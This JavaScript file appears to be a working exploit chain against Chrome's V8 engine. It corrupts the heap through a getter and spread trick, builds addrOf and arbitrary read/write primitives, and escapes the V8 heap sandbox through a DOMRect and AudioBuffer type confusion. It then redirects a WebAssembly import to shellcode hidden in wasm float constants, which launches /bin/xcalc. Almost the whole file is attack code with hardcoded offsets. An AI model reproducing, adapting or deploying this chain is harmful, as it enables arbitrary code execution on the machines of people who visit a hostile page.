const importObject = {
  imports: {
    imported_func: Math.sin
  }
}; //Generated using import_shell.js

var wasmBuffer = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 16, 3, 80, 0, 94, 124, 1, 96, 1, 124, 1, 124, 96, 0, 1, 99, 0, 2, 25, 1, 7, 105, 109, 112, 111, 114, 116, 115, 13, 105, 109, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 1, 3, 3, 2, 1, 2, 7, 21, 2, 4, 109, 97, 105, 110, 0, 1, 10, 109, 97, 107, 101, 95, 97, 114, 114, 97, 121, 0, 2, 10, 136, 2, 2, 6, 0, 32, 0, 16, 0, 11, 254, 1, 1, 1, 99, 0, 65, 18, 251, 7, 0, 33, 0, 32, 0, 65, 0, 68, 49, 246, 49, 210, 49, 192, 235, 29, 251, 14, 0, 32, 0, 65, 1, 68, 104, 108, 99, 0, 0, 144, 235, 32, 251, 14, 0, 32, 0, 65, 2, 68, 104, 47, 120, 99, 97, 88, 235, 32, 251, 14, 0, 32, 0, 65, 3, 68, 104, 47, 98, 105, 110, 91, 235, 32, 251, 14, 0, 32, 0, 65, 4, 68, 144, 144, 72, 193, 224, 32, 235, 32, 251, 14, 0, 32, 0, 65, 5, 68, 72, 1, 216, 80, 84, 95, 235, 32, 251, 14, 0, 32, 0, 65, 6, 68, 86, 87, 84, 94, 144, 144, 235, 32, 251, 14, 0, 32, 0, 65, 7, 68, 104, 58, 48, 46, 48, 144, 235, 32, 251, 14, 0, 32, 0, 65, 8, 68, 104, 76, 65, 89, 61, 88, 235, 32, 251, 14, 0, 32, 0, 65, 9, 68, 104, 68, 73, 83, 80, 91, 235, 32, 251, 14, 0, 32, 0, 65, 10, 68, 144, 72, 193, 224, 32, 144, 235, 32, 251, 14, 0, 32, 0, 65, 11, 68, 72, 1, 216, 80, 84, 144, 235, 32, 251, 14, 0, 32, 0, 65, 12, 68, 65, 90, 82, 65, 82, 84, 235, 32, 251, 14, 0, 32, 0, 65, 13, 68, 90, 184, 59, 0, 0, 0, 235, 32, 251, 14, 0, 32, 0, 65, 14, 68, 15, 5, 90, 49, 210, 82, 235, 32, 251, 14, 0, 32, 0, 11, 0, 26, 4, 110, 97, 109, 101, 1, 19, 2, 1, 4, 109, 97, 105, 110, 2, 10, 109, 97, 107, 101, 95, 97, 114, 114, 97, 121]);
var module = new WebAssembly.Module(wasmBuffer);
var instance = new WebAssembly.Instance(module, importObject);
var func = instance.exports.make_array;
func();
var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Uint32Array(view);
var bigIntView = new BigInt64Array(view);

function ftoi32(f) {
  dblArr[0] = f;
  return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
  intView[0] = i1;
  intView[1] = i2;
  return dblArr[0];
}

function itof(i) {
  bigIntView = BigInt(i);
  return dblArr[0];
}

function ftoi(f) {
  dblArr[0] = f;
  return bigIntView[0];
}

function addrOf(obj) {
  oobObjArr[0] = obj;
  var addrDbl = corrupted_arr[9];
  return ftoi32(addrDbl)[0];
}

function read(addr) {
  var old_value = corrupted_arr[oobOffset];
  corrupted_arr[oobOffset] = i32tof(addr, 2);
  var oldAddr = ftoi32(old_value);
  var out = ftoi32(oobDblArr[0]);
  corrupted_arr[oobOffset] = old_value;
  return out;
}

function write(addr, val1, val2) {
  var old_value = corrupted_arr[oobOffset];
  corrupted_arr[oobOffset] = i32tof(addr, 2);
  oobDblArr[0] = i32tof(val1, val2);
  corrupted_arr[oobOffset] = old_value;
  return;
}

var num = 3;
var nameAddr = 0xdc5;
var dblArrMap = 0x25510d;
var objArrMap = 0x25518d;
var nameAddrF = i32tof(nameAddr, nameAddr);
var fakeDblArray = [1.1, 2.2];
var oobDblArr = [2.2];
var oobObjArr = [view];
oobObjArr[0] = 0x4242;
var fakeDblArrayAddr = 0x4881d;
var fakeDblArrayEle = fakeDblArrayAddr - 0x18;
fakeDblArray[0] = i32tof(dblArrMap, 0x725);
fakeDblArray[1] = i32tof(fakeDblArrayEle, 0x100);
var x = {};

for (let i = 0; i < num; i++) {
  x['a' + i] = 1;
}

var x1 = {};

for (let i = 0; i < num; i++) {
  x1['a' + i] = 1;
}

x1.prop = 1;

x.__defineGetter__("prop", function () {
  let obj = {};
  obj.a0 = 1.5;

  for (let i = 0; i < 1024 + 512; i++) {
    let tmp = {};
    tmp.a0 = 1;

    for (let j = 1; j < num; j++) {
      tmp['a' + j] = 1;
    }

    tmp['p' + i] = 1;
  }

  return 4;
});

x.z = 1;
delete x.z;
var y = { ...x
};
var arr = new Array(256);

for (let i = 0; i < 7; i++) {
  arr[i] = new Array(256);

  for (let j = 0; j < arr[i].length; j++) {
    arr[i][j] = nameAddrF;
  }
}

for (let j = 0; j < 7; j++) {
  let a = arr[j];

  for (let i = 0; i < 256; i++) {
    a[i] = i32tof(nameAddr, fakeDblArrayEle + 0x8); //i32tof(fakeDblArrayEle + 0xc, nameAddr);
  }
}

var z = {};
z.__proto__ = y;
z.p = 1;
z.p;
var oobOffset = 7; //_ZN2v88internal11TrustedCage5base_E - _ZN5blink17V8DOMRectReadOnly18wrapper_type_info_E

var trustedOffset = 0x12e9d0;
var corrupted_arr = y.name;

function getInstance(obj) {
  let addr = addrOf(obj);
  return read(addr + 0x10);
} //v8 heap sandbox escape


var domRect = new DOMRect(1.1, 2.3, 3.3, 4.4);
var node = new AudioBuffer({
  length: 3000,
  sampleRate: 30000,
  numberOfChannels: 2
});
var channel = node.getChannelData(0);
var nodeInstance = getInstance(node);
var channelAddr = addrOf(channel);
var channelInstance = read(channelAddr + 0x3c);
var rectAddr = addrOf(domRect);
var rectInstance = read(rectAddr + 0x10);
var rectType = read(rectAddr + 0x8);
write(rectAddr + 0x10, rectType[0], rectType[1]); //V8DOMRectReadOnly18wrapper_type_info_E

var typeInfo = ftoi32(domRect.width); //Confusion between DOMRect and DOMArrayBuffer allows raw_base_addr_ ptr to be overwritten, causing arbitrary rw

write(rectAddr + 0x10, channelInstance[0], channelInstance[1]);
var rawBase = ftoi32(domRect.x);
var trustedBase = i32tof(typeInfo[0] + trustedOffset, typeInfo[1]); //Set address to read and write

domRect.x = trustedBase;
var dst = new Float32Array(view); //copyFromChannel and copyToChannel can then be used for arbitrary rw

node.copyFromChannel(dst, 0, 0); //dispatch_table_from_imports address

var trustedCage = intView[1];

function findImportTarget(startAddr) {
  var dispatchMap = 0x1f8d;
  var dstBuffer = new ArrayBuffer(0x1000);
  var dstFloat = new Float32Array(dstBuffer);
  var dstInt = new Uint32Array(dstBuffer);
  domRect.x = i32tof(startAddr, trustedCage);
  node.copyFromChannel(dstFloat, 0, 0);

  for (let i = 0; i < dstInt.length; i++) {
    if (dstInt[i] === 0x1f8d) {
      return i;
    }
  }

  return -1;
}

var startAddr = 0x40b00;
var codeIdx = findImportTarget(startAddr);

if (codeIdx != -1) {
  var exported = instance.exports.main;
  var code = i32tof(startAddr + codeIdx * 4 + 0xc, trustedCage);
  domRect.x = code;
  node.copyFromChannel(dst, 0, 0);
  intView[0] = intView[0] + 0xe + 0x100;
  node.copyToChannel(dst, 0, 0);
  intView[0] = 0;
  node.copyFromChannel(dst, 0, 0);
  exported();
  exported();
}